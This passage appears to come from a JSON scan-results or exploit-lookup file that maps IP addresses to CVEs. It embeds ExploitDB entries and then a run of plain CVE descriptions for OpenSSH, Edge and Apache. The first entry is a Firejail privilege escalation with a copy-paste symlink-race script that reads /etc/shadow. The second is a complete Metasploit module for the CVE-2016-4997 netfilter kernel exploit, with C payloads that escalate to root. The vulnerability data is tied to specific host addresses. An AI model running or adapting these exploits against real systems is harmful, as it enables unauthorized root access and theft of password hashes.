(split) {\r\n                                *split = '\\0';\r\n                                char *rp2 = split + 1;\r\n                                if (arg_debug)\r\n                                        printf(\"path %s, file %s\\n\", rp, rp2);\r\n                                print_file_or_dir(rp, rp2, 1);\r\n                        }\r\n                        free(rp);\r\n                }\r\n        }\r\n\r\n        // get file from sandbox and store it in the current directory\r\n        else if (op == SANDBOX_FS_GET) {\r\n                // check source file (sandbox)\r\n                char *src_fname;\r\n                if (asprintf(&src_fname, \"%s%s\", rootdir, fname) == -1)\r\n                        errExit(\"asprintf\");\r\n                EUID_ROOT();\r\n                struct stat s;\r\n                if (stat(src_fname, &s) == -1) {\r\n                        fprintf(stderr, \"Error: Cannot access %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n\r\n                // try to open the source file - we need to chroot\r\n                pid_t child = fork();\r\n                if (child < 0)\r\n                        errExit(\"fork\");\r\n                if (child == 0) {\r\n                        // chroot\r\n                        if (chroot(rootdir) < 0)\r\n                                errExit(\"chroot\");\r\n                        if (chdir(\"/\") < 0)\r\n                                errExit(\"chdir\");\r\n\r\n                        // drop privileges\r\n                        drop_privs(0);\r\n\r\n                        // try to read the file\r\n                        if (access(fname, R_OK) == -1) {\r\n                                fprintf(stderr, \"Error: Cannot read %s\\n\", fname);\r\n                                exit(1);\r\n                        }\r\n                        exit(0);\r\n                }\r\n\r\n                // wait for the child to finish\r\n                int status = 0;\r\n                waitpid(child, &status, 0);\r\n                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);\r\n                else\r\n                        exit(1);\r\n                EUID_USER();\r\n\r\n                // check destination file (host)\r\n                char *dest_fname = strrchr(fname, '/');\r\n                if (!dest_fname || *(++dest_fname) == '\\0') {\r\n                        fprintf(stderr, \"Error: invalid file name %s\\n\", fname);\r\n                        exit(1);\r\n                }\r\n\r\n                if (access(dest_fname, F_OK) == -1) {\r\n                        // try to create the file\r\n                        FILE *fp = fopen(dest_fname, \"w\");\r\n                        if (!fp) {\r\n                                fprintf(stderr, \"Error: cannot create %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                        fclose(fp);\r\n                }\r\n                else {\r\n                        if (access(dest_fname, W_OK) == -1) {\r\n                                fprintf(stderr, \"Error: cannot write %s\\n\", dest_fname);\r\n                                exit(1);\r\n                        }\r\n                }\r\n                // copy file\r\n                EUID_ROOT();\r\n                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);\r\n                printf(\"Transfer complete\\n\");\r\n                EUID_USER();\r\n        }\r\n\r\n        free(fname);\r\n        free(rootdir);\r\n\r\n        exit(0);\r\n}\r\n~~~~\r\n\r\n\r\n\r\n### Code: src/firejail/util.c\r\n~~~~\r\nint copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {\r\n        assert(srcname);\r\n        assert(destname);\r\n\r\n        // open source\r\n        int src = open(srcname, O_RDONLY);\r\n        if (src < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", srcname);\r\n                return -1;\r\n        }\r\n\r\n        // open destination\r\n        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);\r\n        if (dst < 0) {\r\n                fprintf(stderr, \"Warning: cannot open %s, file not copied\\n\", destname);\r\n                close(src);\r\n                return -1;\r\n        }\r\n\r\n        // copy\r\n        ssize_t len;\r\n        static const int BUFLEN = 1024;\r\n        unsigned char buf[BUFLEN];\r\n        while ((len = read(src, buf, BUFLEN)) > 0) {\r\n                int done = 0;\r\n                while (done != len) {\r\n                        int rv = write(dst, buf + done, len - done);\r\n                        if (rv == -1) {\r\n                                close(src);\r\n                                close(dst);\r\n                                return -1;\r\n                        }\r\n\r\n                        done += rv;\r\n                }\r\n        }\r\n\r\n        if (fchown(dst, uid, gid) == -1)\r\n                errExit(\"fchown\");\r\n        if (fchmod(dst, mode) == -1)\r\n                errExit(\"fchmod\");\r\n\r\n        close(src);\r\n        close(dst);\r\n        return 0;\r\n}\r\n</snip>\r\n~~~~\r\n\r\n## Testing \r\n\r\n### Our Dockerfile\r\n\r\n~~~~\r\nFROM ubuntu:latest\r\n\r\nENV wdir /root/firejail\r\n\r\nRUN apt-get update && apt-get install -y git gcc make\r\nRUN useradd -ms /bin/bash daniel && echo \"daniel:password\" | chpasswd\r\nRUN git clone https://github.com/netblue30/firejail.git ${wdir}\r\nWORKDIR ${wdir}\r\nRUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372\r\nRUN ./configure && make && make install\r\n~~~~\r\n\r\n### Our exploit\r\n\r\nThis will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:\r\n\r\n~~~~\r\n#dropper\r\ncat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF\r\nmkdir -p /tmp/exploit\r\ncat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\nint main(int argc, char **argv)\r\n{\r\n    char *fl = \"/etc/shadow\";\r\n\r\n    if(argc > 1) {\r\n        fl = argv[1];\r\n    }\r\n\r\n    while(1) {\r\n        int fd = open(\"owned\", O_CREAT | O_RDWR, 0777);\r\n        if(fd == -1) {\r\n            perror(\"open\");\r\n            exit(1);\r\n        }\r\n        close(fd);\r\n        remove(\"owned\");\r\n        symlink(fl, \"owned\");\r\n        remove(\"owned\");\r\n    }\r\n}\r\nTOCTOU_POC_END\r\ncd /tmp/exploit\r\ngcc ./gaolbreak.c -o gaolbreak\r\n# XXX: change argv[1] to whatever you want\r\n./gaolbreak /etc/shadow\r\nGUEST_JAIL_SCRIPT_EOF\r\n\r\n# run the dropper (symlink attack) in a jail\r\nchmod +x ./gexp.sh\r\nfirejail --noprofile --force --name=el ./gexp.sh &\r\n\r\n# win race using the vulnerable 'firejail --get' command.\r\nmkdir exploitel\r\ncd exploitel\r\nwhile [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done\r\n~~~~",
                "description": "Firejail - Local Privilege Escalation",
                "author": "Daniel Hodson",
                "_id": 41022,
                "source": "ExploitDB",
                "platform": "linux",
                "date": "2017-01-09T00:00:00+00:00",
                "cve": [],
                "type": "local",
                "port": 0
            },
            {
                "code": "##\r\n# This module requires Metasploit: http://metasploit.com/download\r\n# Current source: https://github.com/rapid7/metasploit-framework\r\n##\r\n\r\nrequire \"msf/core\"\r\n\r\nclass MetasploitModule < Msf::Exploit::Local\r\n  Rank = GoodRanking\r\n\r\n  include Msf::Post::File\r\n  include Msf::Exploit::EXE\r\n  include Msf::Exploit::FileDropper\r\n\r\n  def initialize(info = {})\r\n    super(update_info(info,\r\n        'Name'           => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation',\r\n        'Description'    => %q{\r\n          This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3, and currently\r\n          only works against Ubuntu 16.04 (not 16.04.1) with kernel\r\n          4.4.0-21-generic.\r\n          Several conditions have to be met for successful exploitation:\r\n          Ubuntu:\r\n          1. ip_tables.ko (ubuntu), iptable_raw (fedora) has to be loaded (root running iptables -L will do such)\r\n          2. libc6-dev-i386 (ubuntu), glibc-devel.i686  & libgcc.i686 (fedora) needs to be installed to compile\r\n          Kernel 4.4.0-31-generic and newer are not vulnerable.\r\n\r\n          We write the ascii files and compile on target instead of locally since metasm bombs for not\r\n          having cdefs.h (even if locally installed)\r\n        },\r\n        'License'        => MSF_LICENSE,\r\n        'Author'         =>\r\n          [\r\n            'h00die <mike@stcyrsecurity.com>',  # Module\r\n            'vnik'                         # Discovery\r\n          ],\r\n        'DisclosureDate' => 'Jun 03 2016',\r\n        'Platform'       => [ 'linux'],\r\n        'Arch'           => [ ARCH_X86 ],\r\n        'SessionTypes'   => [ 'shell', 'meterpreter' ],\r\n        'Targets'        =>\r\n          [\r\n            [ 'Ubuntu', { } ]\r\n            #[ 'Fedora', { } ]\r\n          ],\r\n        'DefaultTarget'  => 0,\r\n        'References'     =>\r\n          [\r\n            [ 'EDB', '40049'],\r\n            [ 'CVE', '2016-4997'],\r\n            [ 'URL', 'http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=ce683e5f9d045e5d67d1312a42b359cb2ab2a13c']\r\n          ]\r\n      ))\r\n    register_options(\r\n      [\r\n        OptString.new('WritableDir', [ true, 'A directory where we can write files (must not be mounted noexec)', '/tmp' ]),\r\n        OptInt.new('MAXWAIT', [ true, 'Max seconds to wait for decrementation in seconds', 180 ]),\r\n        OptBool.new('REEXPLOIT', [ true, 'desc already ran, no need to re-run, skip to running pwn',false]),\r\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', ['Auto', 'True', 'False']])\r\n      ], self.class)\r\n  end\r\n\r\n  def check\r\n    def iptables_loaded?()\r\n      # user@ubuntu:~$ cat /proc/modules | grep ip_tables\r\n      # ip_tables 28672 1 iptable_filter, Live 0x0000000000000000\r\n      # x_tables 36864 2 iptable_filter,ip_tables, Live 0x0000000000000000\r\n      vprint_status('Checking if ip_tables is loaded in kernel')\r\n      if target.name == \"Ubuntu\"\r\n        iptables = cmd_exec('cat /proc/modules | grep ip_tables')\r\n        if iptables.include?('ip_tables')\r\n          vprint_good('ip_tables.ko is loaded')\r\n        else\r\n          print_error('ip_tables.ko is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('ip_tables')\r\n      elsif target.name == \"Fedora\"\r\n        iptables = cmd_exec('cat /proc/modules | grep iptable_raw')\r\n        if iptables.include?('iptable_raw')\r\n          vprint_good('iptable_raw is loaded')\r\n        else\r\n          print_error('iptable_raw is not loaded.  root needs to run iptables -L or similar command')\r\n        end\r\n        return iptables.include?('iptable_raw')\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    def shemsham_installed?()\r\n      # we want this to be false.\r\n      vprint_status('Checking if shem or sham are installed')\r\n      shemsham = cmd_exec('cat /proc/cpuinfo')\r\n      if shemsham.include?('shem')\r\n        print_error('shem installed, system not vulnerable.')\r\n      elsif shemsham.include?('sham')\r\n        print_error('sham installed, system not vulnerable.')\r\n      else\r\n        vprint_good('shem and sham not present.')\r\n      end\r\n      return (shemsham.include?('shem') or shemsham.include?('sham'))\r\n    end\r\n\r\n    if iptables_loaded?() and not shemsham_installed?()\r\n      return CheckCode::Appears\r\n    else\r\n      return CheckCode::Safe\r\n    end\r\n  end\r\n\r\n  def exploit\r\n    # first thing we need to do is determine our method of exploitation: compiling realtime, or droping a pre-compiled version.\r\n    def has_prereqs?()\r\n      vprint_status('Checking if 32bit C libraries, gcc-multilib, and gcc are installed')\r\n      if target.name == \"Ubuntu\"\r\n        lib = cmd_exec('dpkg --get-selections | grep libc6-dev-i386')\r\n        if lib.include?('install')\r\n          vprint_good('libc6-dev-i386 is installed')\r\n        else\r\n          print_error('libc6-dev-i386 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = cmd_exec('dpkg --get-selections | grep ^gcc-multilib')\r\n        if multilib.include?('install')\r\n          vprint_good('gcc-multilib is installed')\r\n        else\r\n          print_error('gcc-multilib is not installed.  Compiling will fail.')\r\n        end\r\n        gcc = cmd_exec('which gcc')\r\n        if gcc.include?('gcc')\r\n          vprint_good('gcc is installed')\r\n        else\r\n          print_error('gcc is not installed.  Compiling will fail.')\r\n        end\r\n        return gcc.include?('gcc') && lib.include?('install') && multilib.include?('install')\r\n      elsif target.name == \"Fedora\"\r\n        lib = cmd_exec('dnf list installed | grep -E \\'(glibc-devel.i686|libgcc.i686)\\'')\r\n        if lib.include?('glibc')\r\n          vprint_good('glibc-devel.i686 is installed')\r\n        else\r\n          print_error('glibc-devel.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        if lib.include?('libgcc')\r\n          vprint_good('libgcc.i686 is installed')\r\n        else\r\n          print_error('libgcc.i686 is not installed.  Compiling will fail.')\r\n        end\r\n        multilib = false #not implemented\r\n        gcc = false #not implemented\r\n        return (lib.include?('glibc') && lib.include?('libgcc')) && gcc && multilib\r\n      else\r\n        return false\r\n      end\r\n    end\r\n\r\n    compile = false\r\n    if datastore['COMPILE'] == 'Auto' || datastore['COMPILE'] == 'True'\r\n      if has_prereqs?()\r\n        compile = true\r\n        vprint_status('Live compiling exploit on system')\r\n      else\r\n        vprint_status('Dropping pre-compiled exploit on system')\r\n      end\r\n    end\r\n    if check != CheckCode::Appears\r\n      fail_with(Failure::NotVulnerable, 'Target not vulnerable! punt!')\r\n    end\r\n\r\n    desc_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    env_ready_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    pwn_file = datastore[\"WritableDir\"] + \"/\" + rand_text_alphanumeric(8)\r\n    payload_file = rand_text_alpha(8)\r\n    payload_path = \"#{datastore[\"WritableDir\"]}/#{payload_file}\"\r\n\r\n    # direct copy of code from exploit-db, except removed the check for shem/sham and ip_tables.ko since we can do that in the check area here\r\n    # removed         #include <netinet/in.h> per busterb comment in PR 7326\r\n    decr = %q{\r\n      #define _GNU_SOURCE\r\n      #include <stdio.h>\r\n      #include <stdlib.h>\r\n      #include <string.h>\r\n      #include <unistd.h>\r\n      #include <sched.h>\r\n      #include <netinet/in.h>\r\n      #include <linux/sched.h>\r\n      #include <errno.h>\r\n      #include <sys/types.h>\r\n      #include <sys/socket.h>\r\n      #include <sys/ptrace.h>\r\n      #include <net/if.h>\r\n      #include <linux/netfilter_ipv4/ip_tables.h>\r\n      #include <linux/netlink.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n\r\n      #define MALLOC_SIZE 66*1024\r\n\r\n      int decr(void *p) {\r\n          int sock, optlen;\r\n          int ret;\r\n          void *data;\r\n          struct ipt_replace *repl;\r\n          struct ipt_entry *entry;\r\n          struct xt_entry_match *ematch;\r\n          struct xt_standard_target *target;\r\n          unsigned i;\r\n\r\n          sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW);\r\n\r\n          if (sock == -1) {\r\n                  perror(\"socket\");\r\n                  return -1;\r\n          }\r\n\r\n          data = malloc(MALLOC_SIZE);\r\n\r\n          if (data == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          memset(data, 0, MALLOC_SIZE);\r\n\r\n          repl = (struct ipt_replace *) data;\r\n          repl->num_entries = 1;\r\n          repl->num_counters = 1;\r\n          repl->size = sizeof(*repl) + sizeof(*target) + 0xffff;\r\n          repl->valid_hooks = 0;\r\n\r\n          entry = (struct ipt_entry *) (data + sizeof(struct ipt_replace));\r\n          entry->target_offset = 74; // overwrite target_offset\r\n          entry->next_offset = sizeof(*entry) + sizeof(*ematch) + sizeof(*target);\r\n\r\n          ematch = (struct xt_entry_match *) (data + sizeof(struct ipt_replace) + sizeof(*entry));\r\n\r\n          strcpy(ematch->u.user.name, \"icmp\");\r\n          void *kmatch = (void*)mmap((void *)0x10000, 0x1000, 7, 0x32, 0, 0);\r\n          uint64_t *me = (uint64_t *)(kmatch + 0x58);\r\n          *me = 0xffffffff821de10d; // magic number!\r\n\r\n          uint32_t *match = (uint32_t *)((char *)&ematch->u.kernel.match + 4);\r\n          *match = (uint32_t)kmatch;\r\n\r\n          ematch->u.match_size = (short)0xffff;\r\n\r\n          target = (struct xt_standard_target *)(data + sizeof(struct ipt_replace) + 0xffff + 0x8);\r\n          uint32_t *t = (uint32_t *)target;\r\n          *t = (uint32_t)kmatch;\r\n\r\n          printf(\"[!] Decrementing the refcount. This may take a while...\\n\");\r\n          printf(\"[!] Wait for the \\\"Done\\\" message (even if you'll get the prompt back).\\n\");\r\n\r\n          for (i = 0; i < 0xffffff/2+1; i++) {\r\n              ret = setsockopt(sock, SOL_IP, IPT_SO_SET_REPLACE, (void *) data, 66*1024);\r\n          }\r\n\r\n          close(sock);\r\n          free(data);\r\n          printf(\"[+] Done! Now run ./pwn\\n\");\r\n\r\n          return 0;\r\n      }\r\n\r\n      int main(void) {\r\n          void *stack;\r\n          int ret;\r\n\r\n          printf(\"netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik\\n\");\r\n\r\n          ret = unshare(CLONE_NEWUSER);\r\n\r\n          if (ret == -1) {\r\n              perror(\"unshare\");\r\n              return -1;\r\n          }\r\n\r\n          stack = (void *) malloc(65536);\r\n\r\n          if (stack == NULL) {\r\n              perror(\"malloc\");\r\n              return -1;\r\n          }\r\n\r\n          clone(decr, stack + 65536, CLONE_NEWNET, NULL);\r\n\r\n          sleep(1);\r\n\r\n          return 0;\r\n      }\r\n    }\r\n\r\n    # direct copy of code from exploit-db\r\n    pwn = %q{\r\n      #include <stdio.h>\r\n      #include <string.h>\r\n      #include <errno.h>\r\n      #include <unistd.h>\r\n      #include <stdint.h>\r\n      #include <fcntl.h>\r\n      #include <sys/mman.h>\r\n      #include <assert.h>\r\n\r\n      #define MMAP_ADDR 0xff814e3000\r\n      #define MMAP_OFFSET 0xb0\r\n\r\n      typedef int __attribute__((regparm(3))) (*commit_creds_fn)(uint64_t cred);\r\n      typedef uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(uint64_t cred);\r\n\r\n      void __attribute__((regparm(3))) privesc() {\r\n          commit_creds_fn commit_creds = (void *)0xffffffff810a21c0;\r\n          prepare_kernel_cred_fn prepare_kernel_cred = (void *)0xffffffff810a25b0;\r\n          commit_creds(prepare_kernel_cred((uint64_t)NULL));\r\n      }\r\n\r\n      int main() {\r\n          void *payload = (void*)mmap((void *)MMAP_ADDR, 0x400000, 7, 0x32, 0, 0);\r\n          assert(payload == (void *)MMAP_ADDR);\r\n\r\n          void *shellcode = (void *)(MMAP_ADDR + MMAP_OFFSET);\r\n\r\n          memset(shellcode, 0, 0x300000);\r\n\r\n          void *ret = memcpy(shellcode, &privesc, 0x300);\r\n          assert(ret == shellcode);\r\n\r\n          printf(\"[+] Escalating privs...\\n\");\r\n\r\n          int fd = open(\"/dev/ptmx\", O_RDWR);\r\n          close(fd);\r\n\r\n          assert(!getuid());\r\n\r\n          printf(\"[+] We've got root!\");\r\n\r\n          return execl(\"/bin/bash\", \"-sh\", NULL);\r\n      }\r\n    }\r\n\r\n    # the original code printed a line.  However, this is hard to detect due to threading.\r\n    # so instead we can write a file in /tmp to catch.\r\n    decr.gsub!(/printf\\(\"\\[\\+\\] Done\\! Now run \\.\\/pwn\\\\n\"\\);/,\r\n               \"int fd2 = open(\\\"#{env_ready_file}\\\", O_RDWR|O_CREAT, 0777);close(fd2);\" )\r\n\r\n    # patch in to run our payload\r\n    pwn.gsub!(/execl\\(\"\\/bin\\/bash\", \"-sh\", NULL\\);/,\r\n               \"execl(\\\"#{payload_path}\\\", NULL);\")\r\n\r\n    def pwn(payload_path, pwn_file, pwn, compile)\r\n      # lets write our payload since everythings set for priv esc\r\n      vprint_status(\"Writing payload to #{payload_path}\")\r\n      write_file(payload_path, generate_payload_exe)\r\n      cmd_exec(\"chmod 555 #{payload_path}\")\r\n      register_file_for_cleanup(payload_path)\r\n\r\n      # now lets drop part 2, and finish up.\r\n      rm_f pwn_file\r\n      if compile\r\n        print_status \"Writing pwn executable to #{pwn_file}.c\"\r\n        rm_f \"#{pwn_file}.c\"\r\n        write_file(\"#{pwn_file}.c\", pwn)\r\n        cmd_exec(\"gcc #{pwn_file}.c -O2 -o #{pwn_file}\")\r\n        register_file_for_cleanup(\"#{pwn_file}.c\")\r\n      else\r\n        print_status \"Writing pwn executable to #{pwn_file}\"\r\n        write_file(pwn_file, pwn)\r\n      end\r\n      register_file_for_cleanup(pwn_file)\r\n      cmd_exec(\"chmod +x #{pwn_file}; #{pwn_file}\")\r\n    end\r\n\r\n    if not compile # we need to override with our pre-created binary\r\n      # pwn file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-pwn.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      pwn = fd.read(fd.stat.size)\r\n      fd.close\r\n      # desc file\r\n      path = ::File.join( Msf::Config.data_directory, 'exploits', 'CVE-2016-4997', '2016-4997-decr.out')\r\n      fd = ::File.open( path, \"rb\")\r\n      decr = fd.read(fd.stat.size)\r\n      fd.close\r\n\r\n      # overwrite the hardcoded variable names in the compiled versions\r\n      env_ready_file = '/tmp/okDjTFSS'\r\n      payload_path = '/tmp/2016_4997_payload'\r\n    end\r\n\r\n    # check for shortcut\r\n    if datastore['REEXPLOIT']\r\n      pwn(payload_path, pwn_file, pwn, compile)\r\n    else\r\n      rm_f desc_file\r\n      if compile\r\n        print_status \"Writing desc executable to #{desc_file}.c\"\r\n        rm_f \"#{desc_file}.c\"\r\n        write_file(\"#{desc_file}.c\", decr)\r\n        register_file_for_cleanup(\"#{desc_file}.c\")\r\n        output = cmd_exec(\"gcc #{desc_file}.c -m32 -O2 -o #{desc_file}\")\r\n      else\r\n        write_file(desc_file, decr)\r\n      end\r\n      rm_f env_ready_file\r\n      register_file_for_cleanup(env_ready_file)\r\n      #register_file_for_cleanup(desc_file)\r\n      if not file_exist?(desc_file)\r\n        vprint_error(\"gcc failure output: #{output}\")\r\n        fail_with(Failure::Unknown, \"#{desc_file}.c failed to compile\")\r\n      end\r\n      if target.name == \"Ubuntu\"\r\n        vprint_status \"Executing #{desc_file}, may take around 35s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      elsif target.name == \"Fedora\"\r\n        vprint_status \"Executing #{desc_file}, may take around 80s to finish.  Watching for #{env_ready_file} to be created.\"\r\n      end\r\n      cmd_exec(\"chmod +x #{desc_file}; #{desc_file}\")\r\n      sec_waited = 0\r\n\r\n      until sec_waited > datastore['MAXWAIT'] do\r\n        Rex.sleep(1)\r\n        if sec_waited % 10 == 0\r\n          vprint_status(\"Waited #{sec_waited}s so far\")\r\n        end\r\n\r\n        if file_exist?(env_ready_file)\r\n          print_good(\"desc finished, env ready.\")\r\n          pwn(payload_path, pwn_file, pwn, compile)\r\n          return\r\n        end\r\n        sec_waited +=1\r\n      end\r\n    end\r\n  end\r\nend",
                "description": "Linux Kernel 4.6.3 (x86) - 'Netfilter' Local Privilege Escalation (Metasploit)",
                "author": "Metasploit",
                "_id": 40435,
                "source": "ExploitDB",
                "platform": "linux_x86",
                "date": "2016-09-27T00:00:00+00:00",
                "cve": [
                    "CVE-2016-4997"
                ],
                "type": "local",
                "port": 0
            }
        ],
        "CVE-2016-0778": [
            {
                "source": "CVE",
                "_id": "2016-0778",
                "description": "The (1) roaming_read and (2) roaming_write functions in roaming_common.c in the client in OpenSSH 5.x, 6.x, and 7.x before 7.1p2, when certain proxy and forward options are enabled, do not properly maintain connection file descriptors, which allows remote servers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact by requesting many forwardings.",
                "osvdb": [],
                "bid": [
                    80698
                ],
                "cve": [
                    "CVE-2016-0778"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0770",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102397
                ],
                "cve": [
                    "CVE-2018-0770"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0758",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102405
                ],
                "cve": [
                    "CVE-2018-0758"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0777",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102402
                ],
                "cve": [
                    "CVE-2018-0777"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0781",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, and CVE-2018-0778.",
                "osvdb": [],
                "bid": [
                    102404
                ],
                "cve": [
                    "CVE-2018-0781"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0769",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102396
                ],
                "cve": [
                    "CVE-2018-0769"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0776",
                "description": "Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102401
                ],
                "cve": [
                    "CVE-2018-0776"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0772",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0762, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102409
                ],
                "cve": [
                    "CVE-2018-0772"
                ],
                "msb": []
            },
            {
                "source": "CVE",
                "_id": "2018-0762",
                "description": "Internet Explorer in Microsoft Windows 7 SP1, Windows Server 2008 and R2 SP1, Windows 8.1 and Windows RT 8.1, Windows Server 2012 and R2, and Internet Explorer and Microsoft Edge in Windows 10 Gold, 1511, 1607, 1703, 1709, and Windows Server 2016 allows an attacker to execute arbitrary code in the context of the current user, due to how the scripting engine handles objects in memory, aka \"Scripting Engine Memory Corruption Vulnerability\". This CVE ID is unique from CVE-2018-0758, CVE-2018-0768, CVE-2018-0769, CVE-2018-0770, CVE-2018-0772, CVE-2018-0773, CVE-2018-0774, CVE-2018-0775, CVE-2018-0776, CVE-2018-0777, CVE-2018-0778, and CVE-2018-0781.",
                "osvdb": [],
                "bid": [
                    102408
                ],
                "cve": [
                    "CVE-2018-0762"
                ],
                "msb": []
            }
        ],
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.1.166.26": {
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
                "description": "A vulnerability was found in Apache HTTP Server 2.4.17 to 2.4.38. Using fuzzed network input, the http/2 request handling could be made to access freed memory in string comparison when determining the method of a request and thus process the request incorrectly.",
                "osvdb": [],
                "bid": [
                    107669
                ],
                "cve": [
                    "CVE-2019-0196"
                ],
                "msb": []
            }
        ]
    },
    "152.1.166.39": {
        "CVE-2019-0196": [
            {
                "source": "CVE",
                "_id": "2019-0196",
